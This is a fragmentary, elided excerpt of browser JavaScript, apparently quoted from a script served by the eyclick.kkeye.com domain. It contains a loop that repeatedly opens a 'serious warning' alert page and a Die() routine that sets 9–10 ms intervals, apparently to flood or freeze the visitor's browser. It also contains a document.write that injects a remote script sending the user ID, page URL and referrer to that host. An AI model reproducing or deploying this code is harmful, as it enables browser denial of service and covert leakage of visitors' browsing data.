...
function Windowbb() {
    ...
    for (var i = 0; i < 10; i++) {
        url = 'http://eyclick.kkeye.com/js/alert.htm';
        message = "严重警告！";
...
function WindowOpen(turl) {
    ...
    url = turl || 'http://eyclick.kkeye.com/js/alert.htm';
...
function Die() {
    setInterval('cdom()', 10);
    setInterval('calc()', 9);
    //    setInterval('WindowOpen("http://eyclick.kkeye.com/js/alert.htm?t=1")', 189)
...
if (typeof(_kc_userID)!="undefined" && _kc_bF){
 document.write(unescape("%3Cscript")+" charset='gb2312' src='http://eyclick.kkeye.com/ck/?i="+_kc_userID+"&u=" + escape(document.location.href)+"&r=" + escape(_kkeye_a1) + "&t=" + Math.random() + "' "+unescape("type='text/javascript'%3E%3C/script%3E"));
 _kc_bF=false;}